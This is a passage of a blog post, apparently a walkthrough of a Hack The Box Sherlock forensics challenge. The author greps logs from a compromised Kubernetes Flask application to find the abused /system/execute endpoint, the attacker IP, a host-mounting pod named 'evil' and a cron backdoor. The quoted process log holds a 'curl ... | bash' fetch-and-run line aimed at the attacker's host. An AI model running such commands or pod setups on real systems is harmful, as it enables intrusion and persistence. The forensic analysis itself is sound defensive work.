class="line">./default/flask-app-77fbdcfcff-2tqgw/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:04:47] &quot;GET /system/admin HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="task-4"><a href="#task-4" class="headerlink" title="task 4"></a>task 4</h2><h3 id="Which-endpoint-did-the-attacker-discover-through-fuzzing-and-subsequently-exploit"><a href="#Which-endpoint-did-the-attacker-discover-through-fuzzing-and-subsequently-exploit" class="headerlink" title="Which endpoint did the attacker discover through fuzzing and subsequently exploit?"></a>Which endpoint did the attacker discover through fuzzing and subsequently exploit?</h3><blockquote>
+<p>&#x2F;system&#x2F;execute</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -a &#x27;system/execute&#x27; ./* -r |head -10</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app-previous.log:10.42.0.1 - - [07/Nov/2024 18:08:12] &quot;POST /system/execute HTTP/1.1&quot; 200 -</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:10:03] &quot;GET /system/execute HTTP/1.1&quot; 405 -</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:12:05] &quot;GET /system/execute HTTP/1.1&quot; 405 -</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:[2024-11-08 22:14:50,909] ERROR in app: Exception on /system/execute [POST]</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:14:50] &quot;POST /system/execute HTTP/1.1&quot; 500 -</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:[2024-11-08 22:15:23,483] ERROR in app: Exception on /system/execute [POST]</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:15:23] &quot;POST /system/execute HTTP/1.1&quot; 500 -</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:24:40] &quot;POST /system/execute HTTP/1.1&quot; 200 -</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:25:04] &quot;POST /system/execute HTTP/1.1&quot; 200 -</span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:25:05] &quot;POST /system/execute HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<h2 id="task-5"><a href="#task-5" class="headerlink" title="task 5"></a>task 5</h2><h3 id="Which-program-did-the-attacker-attempt-to-install-to-access-their-HTTP-pages"><a href="#Which-program-did-the-attacker-attempt-to-install-to-access-their-HTTP-pages" class="headerlink" title="Which program did the attacker attempt to install to access their HTTP pages?"></a>Which program did the attacker attempt to install to access their HTTP pages?</h3><blockquote>
+<p>curl</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep &#x27;curl&#x27; ./* -r                                                                                                                                                               </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:sh: 1: curl: not found                                                                                                            </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:sh: 1: curl: not found                                                                                                            </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:E: Unable to locate package curl                                                                                                  </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:sh: 1: curl: not found                                                                                                            </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:E: Unable to locate package curl                                                                                                  </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:sh: 1: curl: not found                                                                                                            </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:  libbrotli1 libcurl4 libldap-2.5-0 libldap-common libnghttp2-14 libpsl5                                                          </span><br><span class="line">./default/flask-app-77fbdcfcff-m9rh4/flask-app.log:  curl libbrotli1 libcurl4 libldap-2.5-0 libldap-common libnghttp2-14 libpsl5 </span><br></pre></td></tr></table></figure>
+
+<h2 id="task-6"><a href="#task-6" class="headerlink" title="task 6"></a>task 6</h2><h3 id="What-is-the-IP-address-of-the-attacker"><a href="#What-is-the-IP-address-of-the-attacker" class="headerlink" title="What is the IP address of the attacker?"></a>What is the IP address of the attacker?</h3><blockquote>
+<p>10.129.231.112</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./host-processes.log:root       98203  0.0  0.0   2576   888 ?        S    Nov08   0:00 sh -c curl 10.129.231.112:8080 | bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="task-7"><a href="#task-7" class="headerlink" title="task 7"></a>task 7</h2><h3 id="What-is-the-name-of-the-pod-that-was-compromised-and-used-by-the-attacker-as-the-initial-foothold"><a href="#What-is-the-name-of-the-pod-that-was-compromised-and-used-by-the-attacker-as-the-initial-foothold" class="headerlink" title="What is the name of the pod that was compromised and used by the attacker as the initial foothold?"></a>What is the name of the pod that was compromised and used by the attacker as the initial foothold?</h3><blockquote>
+<p>flask-app-77fbdcfcff-2tqgw</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./system_logs/node_logs/flask-app-77fbdcfcff-2tqgw_default_flask-app-0c6f23d9953921a31ec11074089eb67299221b05410a12185af82d8272bf1af5.log:&#123;&quot;log&quot;:&quot;E: Unable to locate package curl\n&quot;</span><br><span class="line">,&quot;stream&quot;:&quot;stderr&quot;,&quot;time&quot;:&quot;2024-11-08T22:24:09.390009722Z&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="task-8"><a href="#task-8" class="headerlink" title="task 8"></a>task 8</h2><h3 id="What-is-the-name-of-the-malicious-pod-created-by-the-attacker"><a href="#What-is-the-name-of-the-malicious-pod-created-by-the-attacker" class="headerlink" title="What is the name of the malicious pod created by the attacker?"></a>What is the name of the malicious pod created by the attacker?</h3><blockquote>
+<p>evil</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep &#x27;alpine&#x27; ./* -r -a                                  </span><br><span class="line">./default/processes/default_alpine_evil_process_dump.txt:Collecting processes for Namespace: default, Pod: alpine, Container: evil</span><br><span class="line">./default/describes/pods.log:Name:             alpine</span><br><span class="line">./default/describes/pods.log:    Image:         alpine:latest</span><br><span class="line">./default/describes/pods.log:    Image ID:      docker-pullable://alpine@sha256:beefdbd8a1da6d2915566fde36db9db0b524eb737fc57cd1367effd16dc0d06d</span><br><span class="line">./default/alpine/evil-previous.log:Error from server (BadRequest): previous terminated container &quot;evil&quot; in pod &quot;alpine&quot; not found</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----pods.log</span><br><span class="line">Name:             alpine                       </span><br><span class="line">Namespace:        default</span><br><span class="line">Priority:         0                                </span><br><span class="line">Service Account:  default                                                                                                                    </span><br><span class="line">Node:             northpole/10.129.229.38</span><br><span class="line">Start Time:       Fri, 08 Nov 2024 22:39:47 +0000                                                                                            </span><br><span class="line">Labels:           &lt;none&gt;           </span><br><span class="line">Annotations:      &lt;none&gt;           </span><br><span class="line">Status:           Running          </span><br><span class="line">IP:               10.129.229.38                    </span><br><span class="line">IPs:                               </span><br><span class="line">  IP:  10.129.229.38     </span><br><span class="line">  IP:  dead:beef::250:56ff:feb4:5a90</span><br><span class="line">Containers:                                                                                                                                  </span><br><span class="line">  evil:                                                                                                                                      </span><br><span class="line">    Container ID:  docker://f819d84f97e69fc0784c521760594cf1692c39bdc5fbd429f86aed07928a511c                                                 </span><br><span class="line">    Image:         alpine:latest    </span><br><span class="line">    Image ID:      docker-pullable://alpine@sha256:beefdbd8a1da6d2915566fde36db9db0b524eb737fc57cd1367effd16dc0d06d                          </span><br><span class="line">    Port:          &lt;none&gt;             </span><br><span class="line">    Host Port:     &lt;none&gt;          </span><br><span class="line">    Command:                                                                                                                                 </span><br><span class="line">      /bin/sh                                                                                                                                </span><br><span class="line">    Args:                          </span><br><span class="line">      -c                </span><br><span class="line">      sleep 300000                                                                                                                           </span><br><span class="line">    State:          Running                                                                                                                  </span><br><span class="line">      Started:      Fri, 08 Nov 2024 22:39:51 +0000</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  0</span><br><span class="line">    Environment:    &lt;none&gt;</span><br><span class="line">    Mounts:</span><br><span class="line">      /mnt from hostfs (rw)</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-n9bp9 (ro)</span><br><span class="line">Conditions:</span><br><span class="line">  Type                        Status</span><br><span class="line">  PodReadyToStartContainers   True </span><br><span class="line">  Initialized                 True </span><br><span class="line">  Ready                       True </span><br><span class="line">  ContainersReady             True </span><br><span class="line">  PodScheduled                True </span><br><span class="line">Volumes:</span><br><span class="line">  hostfs:</span><br><span class="line">    Type:          HostPath (bare host directory volume)</span><br><span class="line">    Path:          /</span><br><span class="line">    HostPathType:  </span><br><span class="line">  kube-api-access-n9bp9:</span><br><span class="line">    Type:                    Projected (a volume that contains injected data from multiple sources)</span><br><span class="line">    TokenExpirationSeconds:  3607</span><br><span class="line">    ConfigMapName:           kube-root-ca.crt</span><br><span class="line">    ConfigMapOptional:       &lt;nil&gt;</span><br><span class="line">    DownwardAPI:             true</span><br><span class="line">QoS Class:                   BestEffort</span><br><span class="line">Node-Selectors:              &lt;none&gt;</span><br><span class="line">Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s</span><br><span class="line">                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Events:                      &lt;none&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="task-9"><a href="#task-9" class="headerlink" title="task 9"></a>task 9</h2><h3 id="What-is-the-absolute-path-of-the-backdoor-file-left-behind-by-the-attacker"><a href="#What-is-the-absolute-path-of-the-backdoor-file-left-behind-by-the-attacker" class="headerlink" title="What is the absolute path of the backdoor file left behind by the attacker?"></a>What is the absolute path of the backdoor file left behind by the attacker?</h3><blockquote>
+<p>&#x2F;opt&#x2F;backdoor.sh</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep &#x27;/opt/&#x27; ./* -r|head -20</span><br><span class="line">./cron.txt:*/5 *  * * *    /opt/backdoor.sh</span><br></pre></td></tr></table></figure>
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2024/12/20/Sherlocks-Blizzard-Breakdown/"
+      title="【Sherlocks】Blizzard-Breakdown"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        【Sherlocks】Blizzard-Breakdown
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/12/17/box-wp-Heal/"
+      title="【season-6】 htb Heal wp"
+     >
+
+    <p class="title-text">
+      
+        【season-6】 htb Heal wp
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 Flower<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
